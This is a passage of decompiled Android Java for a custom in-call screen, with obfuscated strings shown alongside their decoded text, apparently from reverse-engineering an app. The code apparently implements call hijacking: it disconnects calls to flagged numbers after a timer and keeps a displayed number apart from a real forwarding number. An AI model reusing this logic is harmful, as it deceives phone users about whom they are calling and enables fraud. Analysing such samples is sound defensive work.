                this.ivSpeaker.setImageResource(var3);
        }

    }

    @SuppressLint("InvalidWakeLockTag")
    protected void onCreate(Bundle var1) {
        super.onCreate(var1);
        String var3 = TAG;
        String var2 = var3 +
//         var2.append(bb7d7pu7.m5998("RUkGByobDAgdDA"));
                ", onCreate";
        LogUtils.callLog(var2);
        this.setFullscreen(true, false);
        this.getWindow().addFlags(6815872);
        this.setContentView(R.layout.a_);
        AppStartV.phoneCallActivity = this;
        this.initData();
        this.initView();
        this.startBackgroundAnimation();
        this.createNotification();
        this.createRemoteView();
//         String var4 = bb7d7pu7.m5998("GgwHGgYb");
        String var4 = "sensor";
        SensorManager var5 = (SensorManager) this.getSystemService(Context.SENSOR_SERVICE);
        this.mSensorManager = var5;
        this.mSensor = var5.getDefaultSensor(8);
//         var4 = bb7d7pu7.m5998("GQYeDBs");
        var4 = "power";
        PowerManager var6 = (PowerManager) this.getSystemService(Context.POWER_SERVICE);
        this.mWakeLock = var6.newWakeLock(PowerManager.PROXIMITY_SCREEN_OFF_WAKE_LOCK, var3);
    }

    protected void onDestroy() {
        super.onDestroy();
        StringBuilder var1 = new StringBuilder();
        String var2 = TAG;
        var1.append(var2);
//         var2 = bb7d7pu7.m5998("RUkGBy0MGh0bBhBFSR8AGgALBQxTSQ");
        var2 = ", onDestroy, visible: ";
        var1.append(var2);
        boolean var3 = AppStartV.isPhoneCallActivityVisible;
        var1.append(var3);
//         var2 = bb7d7pu7.m5998("RUk6KjssLCdJJidTSQ");
        var2 = ", SCREEN ON: ";
        var1.append(var2);
        var3 = RecServiceV.isPause;
        var1.append(var3);
        String var6 = var1.toString();
        LogUtils.callLog(var6);
        AppStartV.isCustomDialer = false;
        AppStartV.isCalling = false;
        AppStartV.phoneCallActivity = null;
        mSource = "";
        this.isDestroy = true;
        this.isCancelAutoEndCall = false;
        this.isFirstCreateRemoteView = false;
        this.removeNotifyCallback();
        this.cancelNotification();
        this.cancelTimer();
        PhoneCallManager var7 = this.phoneCallManager;
        if (var7 != null) {
            var3 = var7.isCallActive();
            if (!var3) {
                var7 = this.phoneCallManager;
                var7.destroy();
            }
        }

        PowerManager.WakeLock var8 = this.mWakeLock;
        if (var8 != null) {
            var3 = var8.isHeld();
            if (var3) {
                try {
                    this.mWakeLock.release();
                } catch (Exception var5) {
                    var1 = new StringBuilder();
//                     var2 = bb7d7pu7.m5998("PggCDCUGCgJJDBEKDBkdAAYHU0k");
                    var2 = "WakeLock exception: ";
                    var1.append(var2);
                    var2 = var5.getMessage();
                    var1.append(var2);
                    var6 = var1.toString();
                    LogUtils.callLog(var6);
                }
            }
        }

        SensorManager var9 = this.mSensorManager;
        if (var9 != null) {
            var9.unregisterListener(this);
        }

    }

    protected void onNewIntent(Intent var1) {
        super.onNewIntent(var1);
        String var3 = TAG +
//         var3.append(bb7d7pu7.m5998("RUkGBycMHiAHHQwHHQ"));
                ", onNewIntent";
        LogUtils.callLog(var3);
    }

    protected void onPause() {
        super.onPause();
        AppStartV.isPhoneCallActivityVisible = false;
    }

    protected void onResume() {
        super.onResume();
        AppStartV.isPhoneCallActivityVisible = true;
        Sensor var1 = this.mSensor;
        if (var1 != null) {
            this.mSensorManager.registerListener(this, var1, 3);
        }

    }

    public void onSensorChanged(SensorEvent var1) {
        float[] var2 = var1.values;
        if (var2 != null && var1.sensor.getType() == 8 && this.mWakeLock != null) {
            if ((double) var2[0] == 0.0) {
//                 LogUtils.d(TAG, new Object[]{bb7d7pu7.m5998("AQgHDRpJHBk")});
                LogUtils.d(TAG, "hands up");
                if (!this.mWakeLock.isHeld()) {
                    this.mWakeLock.acquire();
                }
            } else {
//                 LogUtils.d(TAG, new Object[]{bb7d7pu7.m5998("AQgHDRpJBAYfDA0")});
                LogUtils.d(TAG, "hands moved");
                if (!this.mWakeLock.isHeld()) {
                    this.mWakeLock.setReferenceCounted(false);
                    this.mWakeLock.release();
                }
            }
        }

    }

    public void setFullscreen(boolean var1, boolean var2) {
        short var3;
        if (!var1) {
            var3 = 5892;
        } else {
            var3 = 5888;
        }

        int var4 = var3;
        if (!var2) {
            var4 = var3 | 2;
        }

        this.getWindow().getDecorView().setSystemUiVisibility(var4);
        this.setNavigationStatusColor(0);
    }

    public void setNavigationStatusColor(int var1) {
        this.getWindow().addFlags(Integer.MIN_VALUE);
        this.getWindow().setNavigationBarColor(var1);
        this.getWindow().setStatusBarColor(var1);

    }


    static class PhoneActivity$1 implements CallCustomView.CallButtonCallback {
        final PhoneActivity this$0;

        PhoneActivity$1(PhoneActivity var1) {
            this.this$0 = var1;
        }

        public void acceptCall() {
            StringBuilder var1 = new StringBuilder();
            var1.append(PhoneActivity.access$400());
//             var1.append(bb7d7pu7.m5998("RUkICgoMGR0qCAUF"));
            var1.append(", acceptCall");
            LogUtils.callLog(var1.toString());
            PhoneActivity.access$500(this.this$0);
            PhoneCallManager.answer();
            PhoneActivity.access$600().setVisibility(View.VISIBLE);
            PhoneActivity.access$700().setVisibility(View.GONE);
        }

        public void rejectCall() {
            StringBuilder var1 = new StringBuilder();
            var1.append(PhoneActivity.access$400());
//             var1.append(bb7d7pu7.m5998("RUkbDAMMCh0qCAUF"));
            var1.append(", rejectCall");
            LogUtils.callLog(var1.toString());
            PhoneActivity.access$500(this.this$0).reject();
            this.this$0.cancelTimer();
            this.this$0.closeActivity();
        }
    }


    //
// Decompiled by FernFlower - 189ms
//
    static class PhoneActivity$2 extends TimerTask {
        final PhoneActivity this$0;

        PhoneActivity$2(PhoneActivity var1) {
            this.this$0 = var1;
        }

        public void run() {
            PhoneActivity.access$800(this.this$0);
        }
    }


//
// Decompiled by FernFlower - 259ms
//

    static class PhoneActivity$3 implements Runnable {
        final PhoneActivity this$0;
        final String val$switchStatus;

        PhoneActivity$3(PhoneActivity var1, String var2) {
            this.this$0 = var1;
            this.val$switchStatus = var2;
        }

        public void run() {
            PhoneActivity.access$908(this.this$0);
            PhoneActivity.access$1000(this.this$0).setText(this.this$0.getCallingTime());
            String var1 = this.val$switchStatus;
//             if (bb7d7pu7.m5998("Bgc").equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2)
            if ("on".equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2) {
                StringBuilder var4 = new StringBuilder();
                LimitPhoneNumberBean var2 = SettingUtils.isSpecial(PhoneActivity.access$1300());
                if (var2 != null) {
                    StringBuilder var3 = new StringBuilder();
                    var3.append(PhoneActivity.access$400());
//                     var3.append(bb7d7pu7.m5998("RUmP_t-A_t2M4dlFSYz41YzmwoHUxY7O0lNJ"));
                    var3.append(", 时间到, 呼叫转移: ");
                    var3.append(var2.getRealPhoneNumber());
                    var4.append(var3.toString());
                    if (PhoneActivity.access$500(this.this$0).disconnect() || SettingUtils.endCall(this.this$0)) {
//                         String var6 = bb7d7pu7.m5998("RUmP5euP_8SO_dyBxvQ");
                        String var6 = ", 挂断电话";
                        var4.append(var6);
//                         var6 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
                        var6 = "KEY_IS_FORWARDING_HAND_UP";
                        SharedPreferencesUtils.putValue(var6, true);
                        var6 = PhoneActivity.access$1400(this.this$0);
//                         SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), var6);
                        SharedPreferencesUtils.putValue("KEY_FORWARDING_SHOW_PHONE", var6);
                        String var5 = var2.getRealPhoneNumber();
//                         SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), var5);
                        SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", var5);
                    }
                }

                if (var4.length() > 0) {
                    LogUtils.callLog(var4.toString());
                }
            }

        }
    }


//
// Decompiled by FernFlower - 209ms
//

    static class NotifyRunnable implements Runnable {
        final PhoneActivity this$0;

        NotifyRunnable(PhoneActivity var1) {
            this.this$0 = var1;
        }

        public void run() {
            int var1 = PhoneActivity.access$000(this.this$0);
            if (var1 >= 0) {
                NotifyBean var2 = this.this$0.notifyBean;
                if (var2 != null) {
                    var2.time = this.this$0.formatTime(var1);
                    this.this$0.createRemoteView();
                    PhoneActivity.access$100(this.this$0);
                    PhoneActivity.access$300(this.this$0).postDelayed(PhoneActivity.access$200(this.this$0), 1000L);
                }
            }

        }
    }
}

